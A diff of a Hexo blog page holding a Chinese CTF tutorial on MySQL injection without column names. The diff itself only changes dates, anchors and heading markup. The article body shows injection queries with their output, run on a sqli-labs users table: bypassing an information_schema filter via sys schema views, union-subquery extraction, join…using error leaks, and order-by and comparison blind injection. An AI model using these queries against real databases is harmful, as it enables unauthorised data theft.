@@ -14,7 +14,7 @@
 <meta property="og:description" content="一道题引发的无列名注入 | ChaBug安全 聊一聊bypass information_schema-安全客 - 安全资讯平台 (anquanke.com) information_schemainformation_schema这个库保存着mysql服务器的数据库的信息，包括了  数据库名（information_schema.schemata）【schema_name】 表名（informa">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-12-19T04:23:18.000Z">
-<meta property="article:modified_time" content="2023-01-15T07:49:34.013Z">
+<meta property="article:modified_time" content="2023-12-14T13:42:02.089Z">
 <meta property="article:author" content="killeveee">
 <meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
@@ -117,7 +117,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#information-schema"><span class="toc-number">1.</span> <span class="toc-text">information_schema</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#InnoDb"><span class="toc-number">1.1.</span> <span class="toc-text">InnoDb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys"><span class="toc-number">1.2.</span> <span class="toc-text">sys</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join%E2%80%A6using"><span class="toc-number">2.2.</span> <span class="toc-text">join…using</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E5%A4%A7%E5%B0%8F%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">比大小盲注</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">information_schema</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">InnoDb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">sys</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">join…using</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">比大小盲注</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -147,8 +147,12 @@
       
     </div>
 
-
       
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
 
       
     <div class="article-tag">
@@ -164,7 +168,7 @@
   <div class="content e-content" itemprop="articleBody">
     <p><a target="_blank" rel="noopener" href="https://www.chabug.org/ctf/852">一道题引发的无列名注入 | ChaBug安全</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512#h3-4">聊一聊bypass information_schema-安全客 - 安全资讯平台 (anquanke.com)</a></p>
-<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p>information_schema这个库保存着mysql服务器的数据库的信息，包括了</p>
+<h1><span id="information_schema">information_schema</span></h1><p>information_schema这个库保存着mysql服务器的数据库的信息，包括了</p>
 <ul>
 <li>数据库名（information_schema.schemata）【schema_name】</li>
 <li>表名（information_schema.tables）【table_schema，table_name】</li>
@@ -173,8 +177,8 @@
 <blockquote>
 <p>另外MySQL还有一个自带的performance schema库，用于监控MySQL server在一个较低级别的运行过程中的资源消耗、资源等待等情况 。</p>
 </blockquote>
-<h2 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h2><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。但是mysql是<strong>默认关闭</strong>InnoDB存储引擎的。</p>
-<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>mysql在5.7版本中新增了sys schema，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。</p>
+<h2><span id="innodb">InnoDb</span></h2><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。但是mysql是<strong>默认关闭</strong>InnoDB存储引擎的。</p>
+<h2><span id="sys">sys</span></h2><p>mysql在5.7版本中新增了sys schema，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。</p>
 <p>当ctf题目过滤了information_schema的时候，我们可以使用<code>sys.schema_auto_increment_columns</code>来获取表名。但是<code>sys.schema_auto_increment_columns</code> 只能获取到有<u>自增</u>主键的表的数据。</p>
 <p>那如果想通过注入获取到没有自增主键的表的数据怎么办？</p>
 <p>sys库里这两个表可以用：</p>
@@ -187,7 +191,7 @@
 select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>上面的方法的确可以获取数据库中表名信息了，但是并没有找到类似于information_schema中COLUMNS的视图，也就是说我们并不能获取数据。因此引出了无列名注入。</p>
-<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>无列名注入之子查询的原理是依靠union select时产生的<strong>虚拟表</strong>来查询数据，<em>不需要知道列名</em>。</p>
+<h1><span id="无列名注入">无列名注入</span></h1><h2><span id="子查询">子查询</span></h2><p>无列名注入之子查询的原理是依靠union select时产生的<strong>虚拟表</strong>来查询数据，<em>不需要知道列名</em>。</p>
 <p>以sqli的security表为例：</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#查看所有字段
 mysql&gt; select * from users;
@@ -302,7 +306,7 @@ mysql&gt; select n.2 from (select 1,2,3 union select * from users)n;
 +----------+
 14 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="join…using"><a href="#join…using" class="headerlink" title="join…using"></a>join…using</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where id&#x3D;&#39;0&#39; union all select * from (select * from users as a join users as b)as c;
+<h2><span id="joinusing">join…using</span></h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where id&#x3D;&#39;0&#39; union all select * from (select * from users as a join users as b)as c;
 ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
 mysql&gt; select * from users where id&#x3D;&#39;0&#39; union all select * from (select * from users as a join users as b using(id))as c;
 ERROR 1060 (42S21): Duplicate column name &#39;username&#39;
@@ -363,7 +367,7 @@ ERROR 1060 (42S21): Duplicate column name &#39;id&#39;<span aria-hidden="true" c
 ERROR 1060 (42S21): Duplicate column name &#39;username&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>确实如此！</p>
-<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>order by <u>默认升序</u>排序。根据构造的字符与原字段的排序位置的变化来判断字符，跟二分查找类似。</p>
+<h2><span id="order-by盲注">order by盲注</span></h2><p>order by <u>默认升序</u>排序。根据构造的字符与原字段的排序位置的变化来判断字符，跟二分查找类似。</p>
 <p>猜第一位</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where id&#x3D;1 union select 1,2,&#39;c&#39; order by 3;
 +----+----------+----------+
@@ -422,7 +426,7 @@ mysql&gt; select * from users where id&#x3D;1 union select 1,2,&#39;dv&#39; orde
 2 rows in set (0.00 sec)
 #说明第二位是u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="比大小盲注"><a href="#比大小盲注" class="headerlink" title="比大小盲注"></a>比大小盲注</h2><p>跟order by盲注类似</p>
+<h2><span id="比大小盲注">比大小盲注</span></h2><p>跟order by盲注类似</p>
 <p><code>select (select 1,&#39;b&#39;,3) &gt; (select * from users limit 0,1);</code></p>
 <p>通过返回的1或者0，来判断。</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users limit 0,1;
@@ -495,7 +499,7 @@ mysql&gt; select (select 1,&#39;e&#39;,3) &gt; (select * from users limit 0,1);
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#information-schema"><span class="toc-number">1.</span> <span class="toc-text">information_schema</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#InnoDb"><span class="toc-number">1.1.</span> <span class="toc-text">InnoDb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sys"><span class="toc-number">1.2.</span> <span class="toc-text">sys</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join%E2%80%A6using"><span class="toc-number">2.2.</span> <span class="toc-text">join…using</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E5%A4%A7%E5%B0%8F%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">比大小盲注</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">information_schema</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">InnoDb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">sys</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">join…using</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">比大小盲注</span></a></li></ol></li></ol>
       </div>
     
 
